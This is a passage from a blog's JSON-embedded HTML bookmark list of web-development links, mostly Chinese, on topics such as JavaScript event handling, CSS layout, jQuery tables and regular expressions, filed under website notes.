rel=\"noopener\">http://coldnew.github.io/3aac9391/</a><br><a href=\"http://coldnew.github.io/3aac9391/\" target=\"_blank\" rel=\"noopener\">http://coldnew.github.io/3aac9391/</a></p>\n<p>使用 Docker 建置 Gitlab CE 的 Source Control 及 CI 環境 · JIGSAWYE<br><a href=\"https://jigsawye.com/2015/09/25/gitlab-ce-in-docker/\" target=\"_blank\" rel=\"noopener\">https://jigsawye.com/2015/09/25/gitlab-ce-in-docker/</a></p>\n<p>javascript - Event binding on dynamically created elements? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/203198/event-binding-on-dynamically-created-elements/27373951#27373951\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/203198/event-binding-on-dynamically-created-elements/27373951#27373951</a></p>\n<p>事件处理中的 this：attachEvent, addEventListener, onclick | Harttle Land<br><a href=\"http://harttle.com/2015/08/14/event-and-this.html\" target=\"_blank\" rel=\"noopener\">http://harttle.com/2015/08/14/event-and-this.html</a></p>\n<p>Harttle Land | 致力于简单的、一致的、高效的前端开发<br><a href=\"http://harttle.com/\" target=\"_blank\" rel=\"noopener\">http://harttle.com/</a></p>\n<p>Why isn’t CSS visibility working? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/4929310/why-isnt-css-visibility-working\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/4929310/why-isnt-css-visibility-working</a></p>\n<p>说说 focus /focusin /focusout /blur 事件 - WEB 前端路上踩过的坑儿 - SegmentFault<br><a href=\"https://segmentfault.com/a/1190000003942014\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000003942014</a></p>\n<p>Text Compare! - An online diff tool that can find the difference between two texts<br><a href=\"https://text-compare.com/\" target=\"_blank\" rel=\"noopener\">https://text-compare.com/</a></p>\n<p>MobaXterm free Xserver and tabbed SSH client for Windows<br><a href=\"http://mobaxterm.mobatek.net/\" target=\"_blank\" rel=\"noopener\">http://mobaxterm.mobatek.net/</a></p>\n<p>CSS 垂直置中的七個方法 - OXXO.STUDIO<br><a href=\"http://www.oxxostudio.tw/articles/201502/css-vertical-align-7methods.html\" target=\"_blank\" rel=\"noopener\">http://www.oxxostudio.tw/articles/201502/css-vertical-align-7methods.html</a></p>\n<p>要改的地方太多了，那就改天吧 – Hello World!<br><a href=\"https://blog.user.today/\" target=\"_blank\" rel=\"noopener\">https://blog.user.today/</a></p>\n<p>瀏覽器的渲染原理簡介 | InspireGate<br><a href=\"http://inspiregate.windspeaker.co/post/3959-the-browser-39-s-rendering-principle\" target=\"_blank\" rel=\"noopener\">http://inspiregate.windspeaker.co/post/3959-the-browser-39-s-rendering-principle</a></p>\n<p>jQuery.floatThead<br><a href=\"http://mkoryak.github.io/floatThead/\" target=\"_blank\" rel=\"noopener\">http://mkoryak.github.io/floatThead/</a></p>\n<p><a href=\"https://www.sitepoint.com/12-amazing-jquery-tables/\" target=\"_blank\" rel=\"noopener\">https://www.sitepoint.com/12-amazing-jquery-tables/</a><br><a href=\"https://www.sitepoint.com/12-amazing-jquery-tables/\" target=\"_blank\" rel=\"noopener\">https://www.sitepoint.com/12-amazing-jquery-tables/</a></p>\n<p>jquery - How do I add slashes to a string in Javascript? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2195568/how-do-i-add-slashes-to-a-string-in-javascript\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2195568/how-do-i-add-slashes-to-a-string-in-javascript</a></p>\n<p>javascript-chrome 中连续触发 onblur 事件——CSDN 问答频道<br><a href=\"http://ask.csdn.net/questions/352802\" target=\"_blank\" rel=\"noopener\">http://ask.csdn.net/questions/352802</a></p>\n<p>Ocean 學習筆記: 弧度角度換算<br><a href=\"http://contest-start.blogspot.com/2010/02/1.html\" target=\"_blank\" rel=\"noopener\">http://contest-start.blogspot.com/2010/02/1.html</a></p>\n<p>好用的 Markdown 编辑器一览-月光博客<br><a href=\"http://www.williamlong.info/archives/4319.html\" target=\"_blank\" rel=\"noopener\">http://www.williamlong.info/archives/4319.html</a></p>\n<p>在 JavaScript 中如何创建多行字符串(JavaScript Multiline String) - 宅则愤，达则顺 - ITeye 技术网站<br><a href=\"http://yiding-he.iteye.com/blog/58180\" target=\"_blank\" rel=\"noopener\">http://yiding-he.iteye.com/blog/58180</a></p>\n<p>showModelessDialog 改造兼容 firefox 和 ie - 贵贵的博客 - 开发|架构|开源|共享<br><a href=\"http://blog.linuxphp.org/archives/1454/\" target=\"_blank\" rel=\"noopener\">http://blog.linuxphp.org/archives/1454/</a></p>\n<p>IE GET 亂碼- 藍色小舖 BlueShop<br><a href=\"http://www.blueshop.com.tw/board/FUM20041006152627A9N/BRD20100301153624OA4.html\" target=\"_blank\" rel=\"noopener\">http://www.blueshop.com.tw/board/FUM20041006152627A9N/BRD20100301153624OA4.html</a></p>\n<p>javascript window location href without hash? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/5818269/javascript-window-location-href-without-hash\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/5818269/javascript-window-location-href-without-hash</a></p>\n<p>解決勾到「防止此網頁產生其他對話方塊」 – 要改的地方太多了，那就改天吧<br><a href=\"https://blog.user.today/solve-blocking-alert-window/\" target=\"_blank\" rel=\"noopener\">https://blog.user.today/solve-blocking-alert-window/</a></p>\n<p>Press Enter to Submit 背后的那些事 « David Chen’s Blog<br><a href=\"http://david-chen-blog.logdown.com/posts/177766-how-forms-submit-when-pressing-enter\" target=\"_blank\" rel=\"noopener\">http://david-chen-blog.logdown.com/posts/177766-how-forms-submit-when-pressing-enter</a></p>\n<p>JS 函数:IsDate—判断日期格式是否正确及是否为有效的日期 - JavaScript - JS 函数 - 天使建站 angelweb.cn<br><a href=\"http://www.angelweb.cn/Html/JS/cyhs/2011561425594821.html\" target=\"_blank\" rel=\"noopener\">http://www.angelweb.cn/Html/JS/cyhs/2011561425594821.html</a></p>\n<p>20 個優秀的 JavaScript 鍵盤事件處理庫 | 香港矽谷<br><a href=\"http://www.hksilicon.com/articles/443131\" target=\"_blank\" rel=\"noopener\">http://www.hksilicon.com/articles/443131</a></p>\n<p>Things You Might Not Know About jQuery<br><a href=\"https://johnresig.com/apps/workshop/adv-talk/#0\" target=\"_blank\" rel=\"noopener\">https://johnresig.com/apps/workshop/adv-talk/#0</a></p>\n<p>Things You Might Not Know About jQuery<br><a href=\"https://johnresig.com/apps/workshop/adv-talk/\" target=\"_blank\" rel=\"noopener\">https://johnresig.com/apps/workshop/adv-talk/</a></p>\n<p>雲端工具箱, Asana 專案管理系統 (Cloud, Asana) - 大兵萊恩 一路直前<br><a href=\"http://gogoprivateryan.blogspot.com/2016/03/asana-cloud-asana.html\" target=\"_blank\" rel=\"noopener\">http://gogoprivateryan.blogspot.com/2016/03/asana-cloud-asana.html</a></p>\n<p>Web 在線教程<br><a href=\"http://www.w3ii.com/zh-TW/\" target=\"_blank\" rel=\"noopener\">http://www.w3ii.com/zh-TW/</a></p>\n<p>regex - What do lazy and greedy mean in the context of regular expressions? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions</a></p>\n<p>乱象，印迹 » 一名之立，旬月踟躇<br><a href=\"http://www.luanxiang.org/blog/archives/36.html\" target=\"_blank\" rel=\"noopener\">http://www.luanxiang.org/blog/archives/36.html</a></p>\n","categories":["網站筆記"]}]